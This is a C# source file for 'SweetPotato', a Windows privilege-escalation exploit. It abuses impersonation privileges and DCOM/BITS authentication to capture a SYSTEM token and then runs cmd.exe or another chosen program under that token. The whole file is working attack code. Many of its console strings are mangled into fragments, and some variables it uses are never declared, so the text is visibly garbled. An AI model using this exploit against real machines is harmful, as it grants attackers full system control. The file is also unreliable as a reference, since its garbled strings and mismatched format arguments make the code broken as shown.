using Microsoft.Win32;
using Mono.Options;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using static SweetPotato.ImpersonationToken;

namespace SweetPotato {
    class Program {

        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        static bool IsBITSRequired() {

            if(Environment.OSVersion.Version.Major < 10) {
                return false;
            }

            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            var buildNumber = UInt32.Parse(registryKey.GetValue("ReleaseId").ToString());

            if(buildNumber <= 1809) {
                return false;
            }

            return true;        
        }

        static void Main(string[] args) {

            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            string programArgs = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            bool showHelp = false;
            bool isBITSRequired = false;
            bool flag = false;
            Console.WriteLine(

                );

            OptionSet option_set = new OptionSet()
                .Add<string>("c=|clsid=", "CLSID (default BITS: 49", v => clsId = v)
                .Add<ExecutionMethod>("m=|method=", "Aut Auto)", v => executionMethod = v)
                .Add("p=|prog=", "Prograefault cmd.exe)", v => program = v)
                .Add("a=|args=", "Argu null)", v => programArgs = v)
                .Add<ushort>("l=|listenPort=", "COM serv66)", v => port = v)
                .Add("h|help", "Diselp", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    PrintHelp(option_set);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Fas: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try {

                if ( isBITSRequired = IsBITSRequired()) {
                    clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
                    Console.WriteLine("[=] Your versercept");
                }

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {
                    Console.WriteLine("[!] Cancount?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                Console.WriteLine("[+] Attench {4}", 
                    isBITSRequired ? "NTth" : "DCOion", clsId, isBITSRequired ? 5985 :  port, executionMethod, program);

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, isBITSRequired);

                if (!potatoAPI.TriggerDCOM()) {
                    Console.WriteLine("[!] Nd");
                    return;
                }

                Console.WriteLine("[+] Inam");

                IntPtr impersonatedPrimary;
                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {
                    Console.WriteLine("[!] Failxt token");
                    return;
                }

                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = 0x1;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                if(CreatePipe(ref out_read, ref out_write, ref saAttr, 0))
                {
                    Console.WriteLine("[+] Creess");
                }

                SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
                SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);

                Thread systemThread = new Thread(() =>
                {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";
                    si.hStdOutput = out_write;
                    si.hStdError = err_write;
                    si.dwFlags |= STARTF_USESTDHANDLES;
                    Console.WriteLine("[+] Creaed user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;

                    if (programArgs != null)
                    {
                        if (program.Equals("c:\\Windows\\System32\\cmd.exe")) { 
                            programArgs = "/c " + programArgs; 
                        }
                        finalArgs = string.Format("\"{0}\" {1}", program, programArgs);
                        Console.WriteLine("[+] Command : {0} ", finalArgs);
                    }
                    if (executionMethod == ExecutionMethod.Token)
                    {
                        flag = CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);
                        Console.WriteLine("[+] process with pid: {0} created.\n\n=====================================\n", pi.dwProcessId);
                        if (!flag)
                        {
                            Console.WriteLine("[!] Failken: {0}", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    else
                    {
                        flag = CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, @"C:\", ref si, out pi);
                        Console.WriteLine("[+] prated.\n\n=====================================\n", pi.dwProcessId);
                        if (!flag)
                        {
                            Console.WriteLine("[!] Faier: {0} ", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    CloseHandle(out_write);
                    byte[] buf = new byte[BUFSIZE];
                    int dwRead = 0;
                   while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))
                    {
                        byte[] outBytes = new byte[dwRead];
                        Array.Copy(buf, outBytes, dwRead);
                        Console.WriteLine(System.Text.Encoding.Default.GetString(outBytes));
                     }
                    CloseHandle(out_read);
                    Console.WriteLine("[+] Proy!");
                });
                systemThread.Start();
                systemThread.Join();
            }
            catch (Exception e) {
                Console.WriteLine("[!] FaiOM: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }
    }
}
